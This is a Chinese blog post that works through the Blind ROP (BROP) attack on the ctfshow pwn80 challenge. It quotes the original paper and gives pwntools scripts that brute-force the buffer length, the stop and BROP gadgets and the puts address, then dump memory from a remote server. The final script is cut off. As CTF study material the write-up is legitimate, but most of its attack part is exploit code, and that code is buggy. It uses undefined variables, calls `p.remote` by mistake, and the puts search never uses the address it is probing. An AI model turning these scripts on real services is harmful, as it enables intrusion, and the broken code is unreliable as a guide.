<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>brop | zx's Blog</title><meta name="author" content="zx"><meta name="copyright" content="zx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="brop非常nb的论文，也是第一次看论文（真折磨吧） 由于此题是以ctfshow-Pwn入门的pwn80为例，所以写的示例脚本也是基于这个题目 概述：如何在64bit启用了canary，pie，aslr且对这个程序没有半点information的情况下攻击这个程序 前提条件：如果想要攻击成功的话，首先被攻击程序得有一个栈溢出漏洞，而且崩溃之后不会重置地址的布局（也就是crash之后不会重新随机化一">
<meta property="og:type" content="article">
<meta property="og:title" content="brop">
<meta property="og:url" content="https://zx2023qj.github.io/2024/09/03/brop/index.html">
<meta property="og:site_name" content="zx&#39;s Blog">
<meta property="og:description" content="brop非常nb的论文，也是第一次看论文（真折磨吧） 由于此题是以ctfshow-Pwn入门的pwn80为例，所以写的示例脚本也是基于这个题目 概述：如何在64bit启用了canary，pie，aslr且对这个程序没有半点information的情况下攻击这个程序 前提条件：如果想要攻击成功的话，首先被攻击程序得有一个栈溢出漏洞，而且崩溃之后不会重置地址的布局（也就是crash之后不会重新随机化一">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zx2023qj.github.io/img/3.jpg">
<meta property="article:published_time" content="2024-09-03T10:49:10.000Z">
<meta property="article:modified_time" content="2024-09-03T10:50:49.076Z">
<meta property="article:author" content="zx">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="ctfshow">
<meta property="article:tag" content="brop">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zx2023qj.github.io/img/3.jpg"><link rel="shortcut icon" href="/img/3.jpg"><link rel="canonical" href="https://zx2023qj.github.io/2024/09/03/brop/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'brop',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-03 18:50:49'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/3.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="zx's Blog"><span class="site-name">zx's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">brop</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-03T10:49:10.000Z" title="发表于 2024-09-03 18:49:10">2024-09-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-03T10:50:49.076Z" title="更新于 2024-09-03 18:50:49">2024-09-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="brop"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="brop"><a href="#brop" class="headerlink" title="brop"></a>brop</h2><p>非常nb的论文，也是第一次看论文（真折磨吧）</p>
<p>由于此题是以ctfshow-Pwn入门的pwn80为例，所以写的示例脚本也是基于这个题目</p>
<h4 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h4><p>如何在64bit启用了canary，pie，aslr且对这个程序没有半点information的情况下攻击这个程序</p>
<h4 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h4><p>如果想要攻击成功的话，首先被攻击程序得有一个栈溢出漏洞，而且崩溃之后不会重置地址的布局（也就是crash之后不会重新随机化一次）</p>
<h4 id="攻击链条-attack-chain"><a href="#攻击链条-attack-chain" class="headerlink" title="攻击链条(attack chain)"></a>攻击链条(attack chain)</h4><p>其实就是攻击步骤，不过attack chain感觉听起来比较帅啊</p>
<p>丢一段原文搁这，不能只有我一个人被折磨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">H. Attack summary</span><br><span class="line">The optimized BROP attack is as follows:</span><br><span class="line">1) Find where the executable is loaded. Either 0x400000</span><br><span class="line">for non-PIE executables (default) or stack read a</span><br><span class="line">saved return address.</span><br><span class="line">2) Find a stop gadget. This is typically a blocking</span><br><span class="line">system call (like sleep or read) in the PLT. The</span><br><span class="line">attacker finds the PLT in this step too.</span><br><span class="line">3) Find the BROP gadget. The attacker can now control</span><br><span class="line">the first two arguments to calls.</span><br><span class="line">4) Find strcmp in the PLT. The attacker can now</span><br><span class="line">control the first three arguments to calls.</span><br><span class="line">5) Find write in the PLT. The attacker can now dump</span><br><span class="line">the entire binary to find more gadgets.</span><br><span class="line">6) Build a shellcode and exploit the server.</span><br></pre></td></tr></table></figure>

<p>1、找出缓冲区的长度，其实只要顺序爆破一下就好了，输入一个逐渐变长的字符串，找到程序崩溃的临界点，临界值就是缓冲区的长度。不过如果存在canary的话，就覆盖不到ret的位置了，那应该就不会崩溃，需要先对canary进行爆破，但是对canary的爆破也很简单，如果canary每次都不会变的话，只需要一个字节一个字节的进行爆破就可以将原来的正确canary还原出来。</p>
<p><img src="/2024/09/03/brop/image-20240826223422764.png" alt="image-20240826223422764"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28284&quot;)</span><br><span class="line"></span><br><span class="line">def getBufferLength():</span><br><span class="line">	i = 1</span><br><span class="line">	while True:</span><br><span class="line">        try:</span><br><span class="line">            p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28284&quot;)</span><br><span class="line">            p.recvuntil(&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?\n&quot;)</span><br><span class="line">            # 这里注意不要用sendline，sendline会多一个回车</span><br><span class="line">            p.send(i*b&#x27;a&#x27;)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            if b&quot;No passwd&quot; in data:</span><br><span class="line">                i += 1</span><br><span class="line">            else: return i-1</span><br><span class="line">        except EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            return i-1</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	buf_length = getBufferLength()</span><br><span class="line">	print(buf_length)</span><br><span class="line">	# buf_length = 72</span><br></pre></td></tr></table></figure>

<p>2、爆破出缓冲区的长度之后，第二步要做的就是找到一个stop_gadget，即可以让程序停止但不会导致程序崩溃的gadget（其实就是爆破一遍地址，看看是不是有函数的入口或者无限循环函数之类的gadget）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> A starting address can be found from the initial stack</span><br><span class="line">reading phase or 0x400000 can be used on default non-PIE</span><br><span class="line">Linux </span><br><span class="line"></span><br><span class="line">这句话解释的是如何确定BROP（Blind Return Oriented Programming）攻击中的爆破起始地址。具体来说，它涉及两种情况下如何选择爆破的起始地址：</span><br><span class="line"></span><br><span class="line">1. 从初始堆栈读取阶段中找到起始地址</span><br><span class="line">   - 在 BROP 攻击的初始阶段，攻击者可能会通过某种方式泄露或读取当前程序堆栈中的内容。这可以提供一些信息，如返回地址或函数调用的地址，这些地址可能指向程序的可执行代码段（通常是 `.text` 段）。</span><br><span class="line">   - 根据堆栈中的返回地址，攻击者可以确定可能存在可利用的 gadgets 的代码段起始地址。这个地址可以作为后续爆破的起始点。</span><br><span class="line"></span><br><span class="line">2. 使用默认的 0x400000 地址作为起始地址（适用于非 PIE 的 Linux 程序）</span><br><span class="line">   - 在 Linux 系统上，如果程序没有启用 PIE（Position Independent Executable，位置无关可执行文件），那么程序的可执行文件通常会被加载到一个固定的地址，即 `0x400000`。这个地址是 ELF 格式的非 PIE 可执行文件的默认基地址。</span><br><span class="line">   - 因此，在针对非 PIE 程序进行 BROP 爆破时，如果无法获得堆栈中的信息，攻击者可以使用 `0x400000` 作为爆破的起始地址，去寻找有效的 gadgets。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">- 初始堆栈读取：通过读取堆栈内容确定程序代码段的基址，作为爆破起始点。</span><br><span class="line">- 0x400000 地址：对于非 PIE 的 Linux 程序，可以默认使用 `0x400000` 作为起始地址进行爆破。</span><br><span class="line"></span><br><span class="line">这两种方法可以帮助攻击者有效地找到程序中的 gadgets，并进一步进行 BROP 攻击。</span><br></pre></td></tr></table></figure>

<p>原理其实也很简单，由于这个stop_gadget是要覆盖在ret的位置的，如果随便ret到一个bad_gadget，其实程序崩溃的可能性是很大的，但是如果程序没有崩溃，此时就可以认为找到了一个stop_gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">buf_length = 72</span><br><span class="line"></span><br><span class="line">def getStopGadget():</span><br><span class="line">	# 没有任何意义的initial_address，单纯是感觉写address比较膈应</span><br><span class="line">	initial_address = 0x400000</span><br><span class="line">	address = initial_address</span><br><span class="line">	while True:</span><br><span class="line">		print(hex(address))</span><br><span class="line">		try: </span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28284&quot;)</span><br><span class="line">            p.recvuntil(&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?\n&quot;)</span><br><span class="line">            p.send(cyclic(buf_length) + p64(address))</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            if b&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?&quot; in data:</span><br><span class="line">            	return address</span><br><span class="line">            else:</span><br><span class="line">            	p.close()</span><br><span class="line">            	address += 1</span><br><span class="line">         except EOFError:</span><br><span class="line">         	address += 1</span><br><span class="line">         	p.close()</span><br></pre></td></tr></table></figure>

<p>根据这个师傅的文章<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1965871">BROP 攻击技术 ｜ PWN-腾讯云开发者社区-腾讯云 (tencent.com)</a>，也可以通过条件判断来爆破出main的地址。</p>
<p>3、爆破出stop_gadget之后，就可以通过stop_gadget和trap_gadget之间的排列组合来寻找useful_gadget，也就是真正有用的gadget，可以对寄存器进行操作，别忘了我们的目的是调用write之类的函数将程序的二进制文件给dump出来（虽然在本题中是通过puts函数，因为只有一个函数会比较方便调用）</p>
<p>trap_gadget就是会导致程序崩溃的gadget，比如你直接ret指向0x0，它肯定就直接炸了</p>
<p>接下来是看原文环节，我觉得原文这一段还写的挺好的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">The idea is that by varying the position of the stop and trap on the stack, one can deduce the instructions being executed by the gadget, either because the trap or stop will execute, causing a crash or no crash respectively. </span><br><span class="line"></span><br><span class="line">Here are some examples and possible stack layouts:</span><br><span class="line">• probe, stop, traps (trap, trap, . . . ). Will find gadgets</span><br><span class="line">that do not pop the stack like ret or xor rax,</span><br><span class="line">rax; ret.</span><br><span class="line">• probe, trap, stop, traps. Will find gadgets that pop</span><br><span class="line">exactly one stack word like pop rax; ret or pop</span><br><span class="line">rdi; ret. Figure 10 shows an illustration of this.</span><br><span class="line">• probe, stop, stop, stop, stop, stop, stop, stop, traps.</span><br><span class="line">Will find gadgets that pop up to six words (e.g., the</span><br><span class="line">BROP gadget).</span><br><span class="line"></span><br><span class="line">The traps at the end of each sequence ensure that if a gadget skips over the stop gadgets, a crash will occur. In practice only a few traps (if any) will be necessary because the stack will likely already contain values (e.g., strings, integers) that will cause crashes when interpreted as return addresses.</span><br></pre></td></tr></table></figure>

<p>简单来说，就是可以通过stop_gadget和trap_gadget组合的方式来试出被测试的gadget到底有几个pop</p>
<p>此处还有一个重要的知识点，就是在BROP中存在一个叫BROP_gadget的东西，一连pop六次，并且通过gadget+偏移值可以拼凑出另一个重要的gadget，pop rsi（其实也就是通用gadget），在这个师傅的文章<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1965871">BROP 攻击技术 ｜ PWN-腾讯云开发者社区-腾讯云 (tencent.com)</a>中同样有提及，而且有图片，更好理解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">def getBropGadget(buf_length,stop_gadget):</span><br><span class="line">	brop_gadget = stop_gadget</span><br><span class="line">	while True:</span><br><span class="line">		sleep(0.1)</span><br><span class="line">		brop_gadget += 1</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(brop_gadget)</span><br><span class="line">		payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28212&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;find address: 0x%x&quot; % brop_gadget)</span><br><span class="line">			try: # check</span><br><span class="line">				payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">				payload += p64(brop_gadget)</span><br><span class="line">				payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)</span><br><span class="line">				p.remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28212&quot;)</span><br><span class="line">				p.recvline()</span><br><span class="line">				p.sendline(payload)</span><br><span class="line">				p.recvline()</span><br><span class="line">				p.close()</span><br><span class="line">				log.info(&quot;bad address: 0x%x&quot; % brop_gadget)</span><br><span class="line">			except:</span><br><span class="line">				p.close()</span><br><span class="line">				log.info(&quot;gadget address: 0x%x&quot; % brop_gadget)</span><br><span class="line">				return brop_address</span><br><span class="line">		except EOFError as e:</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % brop_gadget)</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;Can&#x27;t connect&quot;)</span><br><span class="line">			brop_gadget -= 1</span><br><span class="line">             </span><br></pre></td></tr></table></figure>

<p>如果pop6次之后还能正常结束就是正确的brop_gadget，然后再check一次，在不加stop_gadget的情况下，如果程序crash了就返回正确的brop_gadget</p>
<p>4、找到puts所在的位置，即plt表的位置</p>
<p>接下来再看看原文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">To control the third argument (rdx) one needs to find a call to strcmp, which sets rdx to the length of the string compared. The PLT is a jump table at the beginning of the executable used for all external calls (e.g., libc). For example, a call to strcmp will actually be a call to the PLT. The PLT will then dereference the Global Offset Table (GOT) and jump to the address stored in it. The GOT will be populated by the dynamic loader with the addresses of library calls depending on where in memory the library got loaded. The GOT is populated lazily, so the first time each PLT entry is called, it will take a slow path via dlresolve to resolve the symbol location and populate the GOT entry for the next time. The structure of the PLT is shown in Figure 11. It has a very unique signature: each entry is 16 bytes apart (16 bytes aligned) and the slow path for each entry can be run at an offset of 6 bytes.</span><br></pre></td></tr></table></figure>

<p>原文使用的是不同的偏移来找plt表，直接看最后一句</p>
<p>不过此处不采用这种方式，而是爆破一手，如果有输出的话就是爆破到puts函数了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def getPutsAddr(buf_length,stop_gadget,brop_gadget):</span><br><span class="line">	pop_rdi_ret = brop_gadget + 9</span><br><span class="line">	puts_addr = stop_gadget</span><br><span class="line">	while True:</span><br><span class="line">		sleep(0.1)</span><br><span class="line">		puts_addr += 1</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(pop_rdi_ret)</span><br><span class="line">		payload += p64(0x400000)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28212&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			if p.recv().startswith(&quot;\x7fELF&quot;):</span><br><span class="line">				log.info(&quot;puts_addr: 0x%x&quot; % puts_addr)</span><br><span class="line">				p.close()</span><br><span class="line">				return puts_addr</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % puts_addr)</span><br><span class="line">			p.close()</span><br><span class="line">		except EOFError as e:</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % puts_addr)</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;Can&#x27;t connect&quot;)</span><br><span class="line">			puts_addr -= 1</span><br></pre></td></tr></table></figure>

<p>5、不是哥们，puts函数都找到了后面还用我解释吗？</p>
<p>原文说的还是dump内存啊，不过基于本题的话只需要用ret2libc就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def DumpMemory(buf_length,stop_gadget,brop_gadget,puts_addr,start_addr,end_addr):</span><br><span class="line">	pop_rdi_addr = brop_gadget + 9</span><br><span class="line">	res = &quot;&quot;</span><br><span class="line">	while start_addr &lt; end_addr:</span><br><span class="line">		sleep(0.1)</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(pop_rdi_addr)</span><br><span class="line">		payload += p64(start_addr)</span><br><span class="line">		payload += p64(puts_plt)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28276&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			data = p.recv(timeout=0.1)</span><br><span class="line">			if data == &#x27;\n&#x27;:</span><br><span class="line">				data = b&#x27;\x00&#x27;</span><br><span class="line">			elif data[-1] == &#x27;\n&#x27;:</span><br><span class="line">				data = data[:-1]</span><br><span class="line">			log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr,(data or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span><br><span class="line">			result += data</span><br><span class="line">			start_addr += len(data)</span><br><span class="line">			p.close()</span><br><span class="line">		except:</span><br><span class="line">			log.info(&#x27;Can&#x27;t connect&#x27;)</span><br><span class="line">	return result</span><br></pre></td></tr></table></figure>

<p>6、最终脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 